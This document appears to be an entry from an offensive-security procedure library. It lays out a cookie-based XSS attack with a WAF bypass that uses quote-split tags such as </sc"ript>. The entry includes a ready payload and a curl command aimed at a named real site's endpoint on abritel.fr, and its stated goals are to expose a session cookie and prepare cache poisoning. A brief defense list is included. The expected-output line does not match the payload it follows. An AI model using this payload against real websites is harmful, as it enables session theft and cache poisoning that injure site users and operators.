---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Set-Malicious-Cookie-for-XSS-Payload
type: procedure
verified: false
submitted: true
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.646Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - xss
  - waf-bypass
  - cookie-injection
commands:
  - '[[commands/curl-set-cookie]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Set-Malicious-Cookie-for-XSS-Payload

## Summary

This procedure crafts a WAF-bypassing XSS payload into the 'hav' cookie, exploiting unsanitized reflection in a JavaScript response to close script tags and inject executable code.

## Description

In the attack scenario, the target web application reflects the 'hav' cookie value directly into a JavaScript variable without escaping angle brackets, while a WAF blocks direct </script> tags but the server inconsistently hides double quotes. This allows payloads like </sc"ript> to evade detection and render as </script> in the output, enabling stored XSS when cached. The procedure targets PHP-based sites with dynamic JS endpoints and requires no authentication.

## Requirements

1. Access to HTTP client like curl or browser dev tools
2. Knowledge of the target endpoint (e.g., https://www.abritel.fr/...php.js)
3. Victim browser environment for later execution

## Defense

Defensive measures and detection strategies:

- Sanitize all cookie reflections in JS outputs with proper escaping (e.g., encode < > " )
- Implement cache keys that vary by user input like cookies to prevent poisoning
- WAF rules to detect and block angle bracket injections in cookies
- Monitor for anomalous JS responses containing script tags

## Objectives

1. Inject XSS payload via cookie to break out of JS context
2. Bypass WAF using quote inconsistencies
3. Prepare for cache poisoning in subsequent steps

## Instructions

### Step 1: Craft Payload

**Context**: Design the payload to close the existing <script> tag and inject an SVG element that executes on load, targeting the session cookie in window.INITIAL_STATE.

**Command** ([[commands/curl-set-cookie]]):
```bash
# No direct command; craft manually: hav=xss</sc"ript><sv"g/onloa"d=aler"t(window.INITIAL_STATE.system.cookie)>
```

> The payload uses escaped quotes to slip past WAF detection of </script>, resulting in reflected JS that executes alert() with the cookie value.

### Step 2: Set Cookie and Test Reflection

**Context**: Use curl to send the request and observe the reflection in the response.

**Command** ([[commands/curl-set-cookie]]):
```bash
curl -H "Cookie: hav=xss</sc\"ript><sv\"g/onloa\"d=aler\"t(window.INITIAL_STATE.system.cookie)>" https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd -v
```

> Expected output includes var hav="xss</script><svg/onload=alert(document.domain)>" in the JS response, confirming reflection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-set-cookie]]

## Tools Used


## Tags

- [[xss]]
- [[waf-bypass]]
- [[cookie-injection]]
